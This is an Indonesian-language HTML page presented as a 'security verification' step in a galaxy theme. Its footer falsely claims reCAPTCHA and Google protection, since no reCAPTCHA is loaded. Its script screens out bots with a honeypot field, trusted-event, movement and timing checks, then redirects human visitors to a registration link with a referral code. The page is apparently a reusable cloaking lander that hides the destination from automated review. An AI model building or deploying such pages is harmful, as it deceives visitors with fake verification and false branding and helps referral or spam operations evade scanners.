<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan - Galaxy Theme</title>
    <style>
        /* ================= RESET & DASAR ================= */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            color: #ffffff;
            background-color: #05020a;
            position: relative;
        }

        /* ================= BACKGROUND GALAXY ================= */
        .galaxy-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: radial-gradient(circle at 15% 50%, rgba(40, 10, 80, 0.8) 0%, transparent 40%),
                        radial-gradient(circle at 85% 30%, rgba(10, 40, 80, 0.8) 0%, transparent 40%),
                        #05020a;
        }

        /* Animasi Bintang */
        .galaxy-bg::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: radial-gradient(white, rgba(255,255,255,.2) 2px, transparent 40px),
                              radial-gradient(white, rgba(255,255,255,.15) 1px, transparent 30px),
                              radial-gradient(white, rgba(255,255,255,.1) 2px, transparent 40px);
            background-size: 550px 550px, 350px 350px, 250px 250px;
            background-position: 0 0, 40px 60px, 130px 270px;
            opacity: 0.3;
            animation: starsAnimation 60s linear infinite;
        }

        @keyframes starsAnimation {
            from { transform: translateY(0); }
            to { transform: translateY(-550px); }
        }

        /* ================= KARTU VERIFIKASI ================= */
        .verification-card {
            background: rgba(20, 10, 40, 0.6);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(80, 150, 255, 0.3);
            border-radius: 24px;
            padding: 40px 30px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5), 
                        0 0 20px rgba(80, 150, 255, 0.2),
                        inset 0 0 20px rgba(80, 150, 255, 0.1);
            position: relative;
            z-index: 10;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Ikon Centang */
        .icon-box {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: rgba(50, 120, 255, 0.15);
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 25px;
            border: 1px solid rgba(50, 120, 255, 0.4);
            box-shadow: 0 0 20px rgba(50, 120, 255, 0.3) inset,
                        0 0 15px rgba(50, 120, 255, 0.2);
        }

        .icon-box svg {
            width: 35px;
            height: 35px;
            fill: none;
            stroke: #4da6ff;
            stroke-width: 3;
            stroke-linecap: round;
            stroke-linejoin: round;
            filter: drop-shadow(0 0 5px rgba(77, 166, 255, 0.8));
        }

        /* Teks */
        h1 {
            font-size: 24px;
            margin-bottom: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        p {
            font-size: 15px;
            color: #a0a0b0;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        /* Tombol */
        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(90deg, #1e70ff, #4da6ff);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(30, 112, 255, 0.4);
            position: relative;
            overflow: hidden;
        }

        button:hover:not(:disabled) {
            box-shadow: 0 6px 25px rgba(30, 112, 255, 0.7);
            transform: translateY(-2px);
            background: linear-gradient(90deg, #2a7cff, #5cb3ff);
        }

        button:active:not(:disabled) {
            transform: translateY(1px);
            box-shadow: 0 2px 10px rgba(30, 112, 255, 0.5);
        }

        button:disabled {
            background: #2a2a3a;
            box-shadow: none;
            cursor: not-allowed;
            color: #666;
            border: 1px solid #3a3a4a;
        }

        /* Footer */
        .footer {
            font-size: 12px;
            color: #666680;
            margin-top: 25px;
            line-height: 1.5;
        }

        .footer a {
            color: #4da6ff;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: #8cc4ff;
            text-decoration: underline;
        }

        /* Honeypot (Tersembunyi dari User, tapi terlihat oleh Bot) */
        #honeypot {
            position: absolute;
            left: -9999px;
            top: -9999px;
            opacity: 0;
            height: 0;
            width: 0;
            z-index: -1;
        }
    </style>
</head>
<body>

    <!-- Background Galaxy -->
    <div class="galaxy-bg"></div>

    <!-- Kartu Verifikasi -->
    <div class="verification-card">
        <!-- Ikon Centang -->
        <div class="icon-box">
            <svg viewBox="0 0 24 24">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
        </div>

        <!-- Teks -->
        <h1>Verifikasi keamanan</h1>
        <p>Klik tombol di bawah untuk melanjutkan proses verifikasi.</p>

        <!-- Honeypot Field (Anti-Bot) -->
        <input type="text" id="honeypot" name="honeypot" tabindex="-1" autocomplete="off">

        <!-- Tombol Aksi -->
        <button id="verify-btn">Melanjutkan</button>

        <!-- Footer -->
        <div class="footer">
            Situs ini dilindungi oleh reCAPTCHA dan berlaku <a href="#">Kebijakan Privasi</a> serta <a href="#">Persyaratan Layanan</a> Google.
        </div>
    </div>

    <!-- ================= JAVASCRIPT (ANTI-BOT & REDIRECT) ================= -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const verifyBtn = document.getElementById('verify-btn');
            const honeypot = document.getElementById('honeypot');
            
            // ==========================================
            // 1. KONFIGURASI URL TUJUAN (UBAH DI SINI)
            // ==========================================
            const TARGET_URL = "https://pafimalang.org/register?referral=jonathannn"; // Ganti dengan URL redirect Anda
            // ==========================================

            // Variabel untuk sistem Anti-Bot
            let hasInteracted = false; // Deteksi pergerakan mouse/sentuhan
            const pageLoadTime = Date.now(); // Waktu halaman dimuat
            
            // Deteksi pergerakan mouse (Desktop)
            document.addEventListener('mousemove', () => {
                hasInteracted = true;
            });

            // Deteksi sentuhan (Mobile)
            document.addEventListener('touchstart', () => {
                hasInteracted = true;
            });

            // Event Listener saat tombol diklik
            verifyBtn.addEventListener('click', (event) => {
                
                // --- SISTEM PERTAHANAN BOT (ANTI-BOT) ---
                
                // 1. Cek Event Trust (Apakah klik benar-benar dari user asli?)
                // Script otomatis (bot) biasanya memiliki event.isTrusted = false
                if (!event.isTrusted) {
                    console.warn("Akses Ditolak: Klik terdeteksi tidak wajar (Bot).");
                    return;
                }

                // 2. Cek Honeypot (Jika bot mengisi field tersembunyi ini)
                if (honeypot.value !== "") {
                    console.warn("Akses Ditolak: Honeypot terisi (Bot).");
                    return;
                }

                // 3. Cek Interaksi (Apakah user menggerakkan mouse/menyentuh layar?)
                // Bot biasanya langsung mengklik tanpa pergerakan mouse
                if (!hasInteracted) {
                    alert("Verifikasi gagal: Silakan gerakkan mouse atau sentuh layar Anda terlebih dahulu.");
                    return;
                }

                // 4. Cek Waktu (Time-based check)
                // Bot biasanya mengklik dalam waktu kurang dari 1 detik
                const timeSpent = Date.now() - pageLoadTime;
                if (timeSpent < 1500) { // Minimal 1.5 detik di halaman
                    alert("Verifikasi gagal: Terlalu cepat. Silakan coba lagi.");
                    return;
                }

                // --- JIKA LOLOS SEMUA PENGECEKAN ---
                
                // Ubah status tombol
                verifyBtn.innerHTML = "Memverifikasi...";
                verifyBtn.disabled = true;
                verifyBtn.style.background = "linear-gradient(90deg, #1e70ff, #4da6ff)";
                verifyBtn.style.boxShadow = "0 0 20px rgba(30, 112, 255, 0.8)";

                // Simulasi proses verifikasi selama 1 detik sebelum redirect
                setTimeout(() => {
                    // Redirect ke URL tujuan
                    window.location.href = TARGET_URL;
                }, 1000);
            });
        });
    </script>
</body>
</html>
